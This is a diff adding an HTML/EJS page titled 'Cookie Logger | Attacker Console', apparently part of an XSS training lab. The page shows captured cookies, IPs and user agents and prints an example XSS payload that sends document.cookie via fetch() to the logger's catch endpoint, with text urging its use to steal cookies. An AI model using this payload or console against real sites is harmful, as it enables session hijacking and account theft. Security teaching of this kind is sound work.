@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title><%= title %></title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/css/style.css">
+  <style>
+    body { background: #0d1117; color: #c9d1d9; }
+    .logger-header {
+      background: #161b22;
+      border-bottom: 1px solid #30363d;
+      padding: 1rem 0;
+    }
+    .logger-title {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+    .logger-title h1 {
+      font-size: 1.5rem;
+      color: #58a6ff;
+    }
+    .terminal-icon { font-size: 1.5rem; }
+    .main { padding: 2rem 0; }
+    .endpoint-box {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      padding: 1rem;
+      margin-bottom: 1.5rem;
+    }
+    .endpoint-label {
+      font-size: 0.85rem;
+      color: #8b949e;
+      margin-bottom: 0.5rem;
+    }
+    .endpoint-url {
+      font-family: 'Fira Code', monospace;
+      background: #0d1117;
+      padding: 0.75rem 1rem;
+      border-radius: 6px;
+      color: #7ee787;
+      font-size: 0.9rem;
+      word-break: break-all;
+    }
+    .log-container {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+    .log-header {
+      background: #21262d;
+      padding: 0.75rem 1rem;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #30363d;
+    }
+    .log-header h2 {
+      font-size: 1rem;
+      color: #c9d1d9;
+    }
+    .log-count {
+      background: #238636;
+      color: white;
+      padding: 0.25rem 0.5rem;
+      border-radius: 12px;
+      font-size: 0.75rem;
+    }
+    .log-body {
+      max-height: 500px;
+      overflow-y: auto;
+    }
+    .log-entry {
+      padding: 1rem;
+      border-bottom: 1px solid #21262d;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.85rem;
+    }
+    .log-entry:last-child { border-bottom: none; }
+    .log-entry:hover { background: #1c2128; }
+    .log-time { color: #8b949e; }
+    .log-ip { color: #d29922; }
+    .log-cookie { color: #f85149; font-weight: 500; }
+    .log-ua { color: #8b949e; font-size: 0.75rem; }
+    .clear-btn {
+      background: #da3633;
+      color: white;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.85rem;
+    }
+    .clear-btn:hover { background: #f85149; }
+    .empty-state {
+      padding: 3rem;
+      text-align: center;
+      color: #8b949e;
+    }
+    .payload-example {
+      background: #0d1117;
+      padding: 0.75rem 1rem;
+      border-radius: 6px;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.8rem;
+      color: #f0883e;
+      margin-top: 0.5rem;
+      overflow-x: auto;
+    }
+  </style>
+</head>
+<body>
+  <header class="logger-header">
+    <div class="container">
+      <div class="logger-title">
+        <span class="terminal-icon">🖥️</span>
+        <h1>Cookie Logger</h1>
+        <span style="color: #8b949e;">| Attacker Console</span>
+      </div>
+    </div>
+  </header>
+
+  <main class="main">
+    <div class="container">
+      <!-- Endpoint Info -->
+      <div class="endpoint-box">
+        <div class="endpoint-label">Catch Endpoint:</div>
+        <div class="endpoint-url" id="endpointUrl"></div>
+        <div class="endpoint-label mt-2">Example XSS Payload:</div>
+        <div class="payload-example" id="payloadExample"></div>
+      </div>
+
+      <!-- Logs -->
+      <div class="log-container">
+        <div class="log-header">
+          <h2>📋 Captured Logs</h2>
+          <div style="display: flex; gap: 0.5rem; align-items: center;">
+            <span class="log-count"><%= logs.length %> entries</span>
+            <a href="/logger/clear" class="clear-btn">Clear All</a>
+          </div>
+        </div>
+        <div class="log-body">
+          <% if (logs.length > 0) { %>
+            <% logs.forEach(log => { %>
+              <div class="log-entry">
+                <div>
+                  <span class="log-time">[<%= log.timestamp %>]</span>
+                  <span class="log-ip">IP: <%= log.ip %></span>
+                </div>
+                <% if (log.cookies) { %>
+                  <div class="log-cookie">🍪 Cookie: <%= log.cookies %></div>
+                <% } %>
+                <% if (log.query && Object.keys(log.query).length > 0) { %>
+                  <div style="color: #a5d6ff;">Query: <%= JSON.stringify(log.query) %></div>
+                <% } %>
+                <div class="log-ua">UA: <%= log.userAgent %></div>
+              </div>
+            <% }) %>
+          <% } else { %>
+            <div class="empty-state">
+              <p>🎯 Waiting for incoming requests...</p>
+              <p style="font-size: 0.85rem; margin-top: 0.5rem;">Use the XSS payload above to steal cookies</p>
+            </div>
+          <% } %>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    // Set endpoint URL dynamically
+    const baseUrl = window.location.origin;
+    document.getElementById('endpointUrl').textContent = baseUrl + '/logger/catch?c=COOKIE_HERE';
+    document.getElementById('payloadExample').textContent = `<img src=x onerror="fetch('${baseUrl}/logger/catch?c='+document.cookie)">`;
+  </script>
+</body>
+</html>
